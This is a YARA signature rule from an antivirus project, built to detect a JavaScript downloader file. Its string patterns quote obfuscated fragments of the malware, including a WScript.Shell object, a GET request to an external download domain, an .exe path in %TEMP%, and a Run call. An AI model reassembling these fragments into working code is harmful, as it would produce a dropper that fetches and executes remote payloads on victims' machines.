rule sig_20160328_fe8e45c0c0028a0bee25a8c4da8bec6d {
  meta:
    description = "datamaliciousorder - file 20160328_fe8e45c0c0028a0bee25a8c4da8bec6d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "22b5ed31ff2ea351e338f211751a028a0c2ef166cdc3e7ef25f073af5a303412"

  strings:
    $s1  = "function Hgeytmkp() {return Hdezp[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"ael5IgF9Q9h.exe\";};" fullword ascii
    $s2  = "Pwokpe[Iceiavxbns](\"GET\", \"http://finnskogen-oppvekstsenter.com/o4paka\", false);" fullword ascii
    $s3  = "do {WScript[Vtysselany](Irpdg() * 11)} while (Pwokpe[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Hdezp = function Bazcenlmn() {return WScript[Chjfa](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Mubmgmto(Ccbbqdt, Ugwdbk){return Ccbbqdt - Ugwdbk;};" fullword ascii
    $s6  = "function Oggig() {return ((Shmpl == true) && (Shmpl == Sbeaqyt)) ? 1 : Smolcelyzp;};" fullword ascii
    $s7  = "function Bvjxxxkdw(Xzjyibj){Hdezp[\"Run\"](Xzjyibj, Smolcelyzp, Smolcelyzp);};" fullword ascii
    $s8  = "function Gjnxucvh(){return Chjfa;};" fullword ascii
    $s9  = "var Fjvtpmroxv = false;" fullword ascii
    $s10 = "Shmpl = true; " fullword ascii
    $s11 = "function Irpdg(){return 22;};" fullword ascii
    $s12 = "function Maira()" fullword ascii
    $s13 = "return Mubmgmto(Yvawlwowue, Uwtyzf);" fullword ascii
    $s14 = "function Iucgzssrd(Uyfkreij) {var Gazzvhqju = (1, 2, 3, 4, 5, Uyfkreij); return Gazzvhqju;};" fullword ascii
    $s15 = "var Shmpl = false;" fullword ascii
    $s16 = "Sbeaqyt = true; " fullword ascii
    $s17 = "function Xnxifocp(){return Pgdxtqjmh;};" fullword ascii
    $s18 = " while (Ufizwqs){" fullword ascii
    $s19 = "var Sbeaqyt = false;" fullword ascii
    $s20 = "} catch(Yyhoxjm){Ufizwqs = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}